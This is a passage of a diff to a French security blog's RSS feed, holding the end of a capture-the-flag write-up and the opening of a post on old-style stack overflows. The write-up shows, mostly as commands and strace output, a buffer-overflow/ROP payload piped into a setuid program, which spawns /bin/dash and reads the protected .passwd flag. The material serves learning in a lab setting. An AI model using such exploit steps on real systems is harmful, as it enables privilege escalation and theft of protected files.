+&lt;pre&gt;&lt;code&gt;$ (perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot;&#39;) | strace ./prog
+execve(&amp;quot;./prog&amp;quot;, [&amp;quot;./prog&amp;quot;], [/* 19 vars */]) = 0
+uname({sys=&amp;quot;Linux&amp;quot;, node=&amp;quot;host&amp;quot;, ...}) = 0
+brk(0)                                  = 0x44cf490
+brk(0x44d0650)                          = 0x44d0650
+arch_prctl(ARCH_SET_FS, 0x44cfd40)      = 0
+readlink(&amp;quot;/proc/self/exe&amp;quot;, &amp;quot;/home/user/prog&amp;quot;, 4096) = 32
+brk(0x44f1650)                          = 0x44f1650
+brk(0x44f2000)                          = 0x44f2000
+access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
+fstat(0, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x3811996c000
+read(0, &amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;..., 4096) = 352
+read(0, &amp;quot;&amp;quot;, 4096)                       = 0
+fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 6), ...}) = 0
+mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x3811996b000
+write(1, &amp;quot;Hex result: 41414141414141414141&amp;quot;..., 569Hex result: 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141160100000c010000424242424242) = 569
+execve(&amp;quot;Be@&amp;quot;, [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SI_KERNEL, si_addr=0} ---
++++ killed by SIGSEGV +++
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On remarque la ligne:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;execve(&amp;quot;Be@&amp;quot;, [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On est content, on a la confirmation qu&amp;rsquo;&lt;code&gt;execve()&lt;/code&gt; est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que&amp;hellip; &lt;code&gt;&amp;quot;Be@&amp;quot;&lt;/code&gt; n&amp;rsquo;est pas trouvé (&lt;code&gt;ENOENT&lt;/code&gt;)!  En fait le programme regarde dans le &lt;code&gt;CWD&lt;/code&gt;.  Il faut donc qu&amp;rsquo;on exécute notre programme depuis le répertoire contenant notre wrapper a &lt;code&gt;/bin/dash&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cd /tmp/p &amp;amp;&amp;amp; (perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot;&#39;) | strace ~/prog
+[...]
+rt_sigaction(SIGTERM, NULL, {SIG_DFL, [], 0}, 8) = 0
+rt_sigaction(SIGTERM, {SIG_DFL, ~[RTMIN RT_1], SA_RESTORER, 0x28c41d06cb0}, NULL, 8) = 0
+read(10, &amp;quot;#!/bin/dash\n\n/bin/dash\n&amp;quot;, 8192) = 23
+clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x28c422a5a10) = 3704
+wait4(-1, [{WIFEXITED(s) &amp;amp;&amp;amp; WEXITSTATUS(s) == 0}], 0, NULL) = 3704
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=3704, si_status=0, si_utime=0, si_stime=0} ---
+rt_sigreturn()                          = 3704
+read(10, &amp;quot;&amp;quot;, 8192)                      = 0
+exit_group(0)                           = ?
++++ exited with 0 +++
+$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok, notre programme rend la main immédiatement.  Il a dû prendre un &lt;code&gt;EOF&lt;/code&gt; ou une séquence terminant le shell.  On va utiliser le trick du built-in &lt;code&gt;cat&lt;/code&gt;, pour maintenir le stdin ouvert (et on ajoute un &lt;code&gt;\n&lt;/code&gt; pour flusher les buffers):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ (perl -e &#39;print &amp;quot;&#39;$sc&#39;&amp;quot; . &amp;quot;\n&amp;quot;&#39;; cat) |  ~/prog
+Hex result: 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141160100000c010000424242424242
+ls
+Be@  ropchain.py  rp-lin-x64
+cd /home/user
+ls -la
+total 876
+drwxr-x---  2 user-cracked user           4096 May 25  2015 .
+drwxr-xr-x 27 root         root           4096 Sep 26 20:01 ..
+-r--------  1 user-cracked user-cracked     23 Jun  7  2015 .passwd
+-rwsr-x---  1 user-cracked user         877214 May 16  2015 prog
+-rw-r-----  1 user-cracked user            383 May 24  2015 prog.c
+cat .passwd
+CeciEstMonFlagTagadaTsoinTsoin!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Et voilà!  Youpi!&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>Exploiter un stack overflow à l&#39;ancienne.</title>
-      <link>https://unix4fun.github.io/post/exploiter-un-stack-overflow/</link>
+      <link>http://github.unix4fun.io/post/exploiter-un-stack-overflow/</link>
       <pubDate>Fri, 23 Sep 2016 07:38:13 +0200</pubDate>
       
-      <guid>https://unix4fun.github.io/post/exploiter-un-stack-overflow/</guid>
+      <guid>http://github.unix4fun.io/post/exploiter-un-stack-overflow/</guid>
       <description>&lt;p&gt;Youpla la compagnie! Ça fait un bail non? :) Bon, récemment je me suis mis à regarder un peu les vieilles failles de sécu des années 90&amp;rsquo;/début 2000. Ok ok, de nos jours c&amp;rsquo;est complètement différent, on a des milliards de protections (PIE, ASLR, relro, stack canary, etc). Mais pour ma culture générale, j&amp;rsquo;ai voulu regarder. J&amp;rsquo;ai donc cherché sur google un site proposant des challenges, et je suis tombé sur l&amp;rsquo;un d&amp;rsquo;eux qui est vraiment bien fichu: il propose une dizaine de catégories (web, cryptanalyse, crackme, exploitation système, etc). Il propose de se connecter sur des machines où l&amp;rsquo;environnement est déjà préparé, etc.&lt;/p&gt;
 
 &lt;p&gt;NOTE: je ne le nomme pas, non pas pour ne pas faire de la publicité, mais parce qu&amp;rsquo;en traînant un peu mes guêtre par là, les administrateurs n&amp;rsquo;aiment pas trop que les solutions se trouvent trop facilement sur le net. Donc je vais tenter de rendre la recherche de solution un peu plus compliquée tout en restant cohérent (j&amp;rsquo;espère).&lt;/p&gt;
